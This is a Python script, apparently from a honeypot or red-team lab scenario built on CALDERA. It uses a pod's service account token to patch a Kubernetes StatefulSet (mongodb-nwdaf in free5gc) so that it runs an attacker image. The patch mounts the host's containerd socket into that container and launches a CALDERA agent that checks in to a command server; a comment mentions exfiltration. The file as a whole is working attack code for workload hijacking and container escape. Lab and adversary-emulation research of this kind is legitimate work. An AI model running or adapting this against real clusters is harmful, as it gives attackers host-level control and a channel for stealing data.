"""Patch mongodb-nwdaf into the KC02 child CALDERA agent.

This script is intentionally narrow for the lab scenario: it only patches the
existing StatefulSet in the current namespace, changes the existing `mongodb`
container image to the attacker image, and adds the containerd socket mount.
"""

from __future__ import annotations

import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

NAMESPACE = os.getenv("KC2_TARGET_NAMESPACE", "free5gc")
STATEFULSET = os.getenv("KC2_TARGET_STATEFULSET", "mongodb-nwdaf")
TOKEN_FILE = Path(os.getenv("KUBERNETES_TOKEN_FILE", "/var/run/secrets/kubernetes.io/serviceaccount/token"))
CA_FILE = os.getenv("KUBERNETES_CA_FILE", "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")


def env_float(name: str, default: float, minimum: float = 0.0) -> float:
    try:
        return max(minimum, float(os.getenv(name, str(default))))
    except ValueError:
        return default


def api_server() -> str:
    host = os.environ.get("KUBERNETES_SERVICE_HOST")
    port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
    if not host:
        host = os.environ.get("KUBERNETES_SERVICE_DNS", "kubernetes.default.svc")
    return f"https://{host}:{port}"


def k8s_request(
    method: str,
    path: str,
    body: dict[str, Any] | None = None,
    content_type: str = "application/json",
) -> dict[str, Any]:
    if not TOKEN_FILE.is_file():
        raise RuntimeError(f"service account token not found: {TOKEN_FILE}")

    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(
        api_server() + path,
        data=data,
        method=method,
        headers={
            "Authorization": f"Bearer {TOKEN_FILE.read_text(encoding='utf-8').strip()}",
            "Accept": "application/json",
            "Content-Type": content_type,
        },
    )

    ctx = ssl.create_default_context(cafile=CA_FILE) if Path(CA_FILE).is_file() else ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
            raw = resp.read()
            return json.loads(raw.decode("utf-8")) if raw else {}
    except urllib.error.HTTPError as exc:
        error_body = exc.read().decode("utf-8", "replace")
        raise RuntimeError(f"Kubernetes API {method} {path} failed: HTTP {exc.code}: {error_body}") from exc


def wait_for_statefulset_rollout(timeout: float, interval: float = 2.0) -> None:
    deadline = time.time() + timeout
    path = f"/apis/apps/v1/namespaces/{NAMESPACE}/statefulsets/{STATEFULSET}"
    last_status = ""

    while time.time() < deadline:
        item = k8s_request("GET", path, None)
        metadata = item.get("metadata") if isinstance(item.get("metadata"), dict) else {}
        spec = item.get("spec") if isinstance(item.get("spec"), dict) else {}
        status = item.get("status") if isinstance(item.get("status"), dict) else {}

        generation = int(metadata.get("generation") or 0)
        observed = int(status.get("observedGeneration") or 0)
        replicas = int(spec.get("replicas") or 1)
        ready = int(status.get("readyReplicas") or 0)
        updated = int(status.get("updatedReplicas") or 0)
        current = f"observed={observed}/{generation} updated={updated}/{replicas} ready={ready}/{replicas}"

        if observed >= generation and updated >= replicas and ready >= replicas:
            return

        if current != last_status:
            print(f"waiting for StatefulSet {NAMESPACE}/{STATEFULSET}: {current}")
            last_status = current

        time.sleep(interval)

    raise RuntimeError(
        f"timed out waiting for StatefulSet {NAMESPACE}/{STATEFULSET} rollout: "
        f"{last_status or 'unknown status'}"
    )


def main() -> int:
    registry = os.getenv("REGISTRY_NAME", "registry")
    registry_port = os.getenv("REGISTRY_PORT", "5000")
    image_version = os.getenv("IMAGE_VERSION", "2.0.2")
    attacker_addr = os.getenv("ATTACKERADDR", "attacker")

    attacker_image = os.getenv("KC2_CHILD_IMAGE", f"{registry}:{registry_port}/nwdaf:{image_version}")
    caldera_url = os.getenv("CALDERA_URL", "http://caldera:8888")

    child_group = os.getenv("KC2_CHILD_GROUP", "outside")
    child_role = os.getenv("KC2_CHILD_ROLE", "child")

    # PAW fisso del child agent. Serve allo step finale per cancellare
    # esattamente questo agent da CALDERA dopo l'esfiltrazione.
    child_paw = os.getenv("KC2_CHILD_PAW", "kc2-mongodb-nwdaf")

    socket_host_path = os.getenv("KC2_CONTAINERD_SOCKET", "/run/containerd/containerd.sock")
    socket_mount_path = os.getenv("KC2_CONTAINERD_SOCKET_MOUNT", "/host/run/containerd/containerd.sock")

    rollout_timeout = env_float("KC2_CHILD_ROLLOUT_TIMEOUT", 180.0, 1.0)
    agent_grace_seconds = env_float("KC2_CHILD_AGENT_GRACE_SECONDS", 20.0, 0.0)

    patch = {
        "spec": {
            "template": {
                "metadata": {
                    "annotations": {
                        "kc2.honeypot/patched-at": str(int(time.time())),
                        "kc2.honeypot/role": "child-agent",
                    },
                    "labels": {
                        "honeypot.attack.kc": "KC2",
                        "honeypot.attack.role": "child",
                    },
                },
                "spec": {
                    "serviceAccountName": "nfs",
                    "automountServiceAccountToken": True,
                    "volumes": [
                        {
                            "name": "socket",
                            "hostPath": {
                                "path": socket_host_path,
                                "type": "Socket",
                            },
                        }
                    ],
                    "containers": [
                        {
                            "name": "mongodb",
                            "image": attacker_image,
                            "imagePullPolicy": "IfNotPresent",
                            "env": [
                                {"name": "GROUP", "value": child_group},
                                {"name": "KC_AGENT_ROLE", "value": child_role},
                                {"name": "SANDCAT_PAW", "value": child_paw},
                                {"name": "CALDERA_URL", "value": caldera_url},
                                {"name": "WAIT", "value": "0"},
                                {"name": "DATA_PATH", "value": "/tmp/KCData"},
                                {"name": "ATTACKER_START_SCRIPT", "value": "/opt/caldera/start.sh"},
                                {"name": "ATTACKER_EXECUTION_SCRIPT", "value": "wait.sh"},
                                {"name": "DOCKER_DAEMON", "value": "0"},
                                {"name": "CRICTL_RUNTIME_PATH", "value": socket_mount_path},
                                {"name": "REGISTRY_NAME", "value": registry},
                                {"name": "REGISTRY_PORT", "value": registry_port},
                                {"name": "IMAGE_VERSION", "value": image_version},
                                {"name": "ATTACKERADDR", "value": attacker_addr},
                            ],
                            "volumeMounts": [
                                {
                                    "name": "socket",
                                    "mountPath": socket_mount_path,
                                    "mountPropagation": "HostToContainer",
                                }
                            ],
                        }
                    ],
                },
            }
        }
    }

    # Fail early with a readable message if the target does not exist or RBAC is insufficient.
    k8s_request("GET", f"/apis/apps/v1/namespaces/{NAMESPACE}/statefulsets/{STATEFULSET}", None)

    k8s_request(
        "PATCH",
        f"/apis/apps/v1/namespaces/{NAMESPACE}/statefulsets/{STATEFULSET}",
        patch,
        "application/strategic-merge-patch+json",
    )

    wait_for_statefulset_rollout(rollout_timeout)

    if agent_grace_seconds:
        print(f"waiting {agent_grace_seconds:g}s for KC2 child agent check-in")
        time.sleep(agent_grace_seconds)

    print(f"patched StatefulSet {NAMESPACE}/{STATEFULSET} with image {attacker_image}")
    print(f"KC2 child agent PAW: {child_paw}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"patch-mongodb-nwdaf failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
